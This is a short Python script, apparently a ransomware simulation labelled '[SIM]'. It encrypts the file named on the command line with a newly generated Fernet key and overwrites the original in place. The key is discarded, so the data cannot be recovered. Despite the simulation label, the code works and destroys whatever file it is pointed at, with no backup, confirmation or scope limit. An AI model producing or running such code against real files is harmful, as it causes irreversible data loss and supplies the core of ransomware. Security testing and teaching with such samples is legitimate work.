from cryptography.fernet import Fernet
import sys

file_path = sys.argv[1]

key = Fernet.generate_key()
cipher = Fernet(key)

with open(file_path, "rb") as f:
    data = f.read()

encrypted = cipher.encrypt(data)

with open(file_path, "wb") as f:
    f.write(encrypted)

print(f"[SIM] File encrypted: {file_path}")
